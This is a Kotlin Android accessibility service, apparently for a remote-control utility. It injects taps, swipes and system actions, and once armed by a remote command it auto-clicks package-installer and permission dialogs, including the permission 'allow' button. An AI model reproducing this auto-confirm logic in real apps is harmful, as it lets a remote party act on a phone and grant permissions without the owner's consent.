package com.example.localutility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.res.Resources
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class RemoteInputService : AccessibilityService() {

    companion object {
        var instance: RemoteInputService? = null
        var isAutoUninstallArmed: Boolean = false
    }

    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d("RemoteInputService", "Accessibility Service Connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // STRICT SAFETY GATE: Never perform auto-clicks unless explicitly triggered by a remote uninstall command
        if (event == null || !isAutoUninstallArmed) return

        val pkg = event.packageName?.toString() ?: ""
        // Only target package installer dialogs (NEVER generic android or settings)
        if (pkg.contains("packageinstaller", ignoreCase = true) ||
            pkg.contains("permissioncontroller", ignoreCase = true)
        ) {
            mainHandler.postDelayed({
                if (isAutoUninstallArmed) {
                    tryAutoConfirmUninstall()
                }
            }, 350)
        }
    }

    private fun tryAutoConfirmUninstall() {
        try {
            val activeRoot = rootInActiveWindow
            if (activeRoot != null && processWindowForUninstall(activeRoot)) {
                isAutoUninstallArmed = false
                return
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val currentWindows = windows
                for (win in currentWindows) {
                    val root = win.root ?: continue
                    if (processWindowForUninstall(root)) {
                        isAutoUninstallArmed = false
                        return
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("RemoteInputService", "Error during tryAutoConfirmUninstall", e)
        }
    }

    private fun processWindowForUninstall(root: AccessibilityNodeInfo): Boolean {
        // Look for Positive Button IDs specific to package installer dialogs
        val buttonIds = listOf(
            "com.android.packageinstaller:id/ok_button",
            "com.google.android.packageinstaller:id/ok_button",
            "com.android.packageinstaller:id/btn_ok",
            "com.android.permissioncontroller:id/permission_allow_button",
            "android:id/button1"
        )

        for (id in buttonIds) {
            val list = root.findAccessibilityNodeInfosByViewId(id)
            for (node in list) {
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d("RemoteInputService", "Auto-confirmed uninstall via id: $id")
                    return true
                }
            }
        }

        // Look for Positive Button Texts (English & Hindi)
        val buttonTexts = listOf("OK", "Uninstall", "Delete", "अनइंस्टॉल", "ठीक है")
        for (text in buttonTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            for (node in nodes) {
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d("RemoteInputService", "Auto-confirmed uninstall via text: $text")
                    return true
                } else if (node.parent?.isClickable == true && node.parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d("RemoteInputService", "Auto-confirmed uninstall via parent of: $text")
                    return true
                }
            }
        }

        return false
    }

    override fun onInterrupt() {
        instance = null
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    fun dispatchTap(xNorm: Float, yNorm: Float) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return

        val displayMetrics = Resources.getSystem().displayMetrics
        val screenWidth = displayMetrics.widthPixels
        val screenHeight = displayMetrics.heightPixels

        val actualX = xNorm * screenWidth
        val actualY = yNorm * screenHeight

        dispatchTapPixels(actualX, actualY)
    }

    fun dispatchSwipe(startXNorm: Float, startYNorm: Float, endXNorm: Float, endYNorm: Float) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return

        val displayMetrics = Resources.getSystem().displayMetrics
        val screenWidth = displayMetrics.widthPixels
        val screenHeight = displayMetrics.heightPixels

        val path = Path().apply {
            moveTo(startXNorm * screenWidth, startYNorm * screenHeight)
            lineTo(endXNorm * screenWidth, endYNorm * screenHeight)
        }

        val stroke = GestureDescription.StrokeDescription(path, 0, 300)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        dispatchGesture(gesture, null, null)
    }

    private fun dispatchTapPixels(actualX: Float, actualY: Float) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return

        val path = Path().apply {
            moveTo(actualX, actualY)
        }

        val stroke = GestureDescription.StrokeDescription(path, 0, 50)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        dispatchGesture(gesture, null, null)
    }

    fun executeGlobalAction(actionType: String) {
        when (actionType) {
            "BACK" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "HOME" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "RECENTS" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "NOTIFICATIONS" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "QUICK_SETTINGS" -> performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
            "LOCK_SCREEN" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                }
            }
        }
    }
}
